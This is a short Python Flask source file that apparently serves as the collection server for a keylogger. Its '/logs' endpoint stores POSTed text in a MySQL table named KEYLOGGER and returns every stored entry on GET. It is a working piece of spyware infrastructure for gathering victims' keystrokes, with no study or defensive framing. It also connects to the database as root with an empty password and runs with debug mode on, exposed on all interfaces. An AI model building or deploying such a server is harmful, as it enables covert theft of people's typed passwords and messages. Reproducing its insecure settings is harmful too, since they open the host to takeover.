from flask import Flask, request, jsonify
import mysql.connector

app = Flask(__name__)

mydb = mysql.connector.connect(host = 'localhost', user = 'root', passwd = '', database = 'test')
cur = mydb.cursor()


@app.route('/')
def display():
    return jsonify("Hello world!")

@app.route('/logs', methods=['POST','GET'])
def predict():

    if request.method == 'POST':
        text = request.form.get('command')
        cur.execute("INSERT INTO KEYLOGGER (LOGS) VALUES(%s);",(text,))
        mydb.commit()
        return jsonify(text)
    elif request.method == 'GET':
        cur.execute("SELECT * FROM KEYLOGGER;")
        val = cur.fetchall()
        return val
        
    
    

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)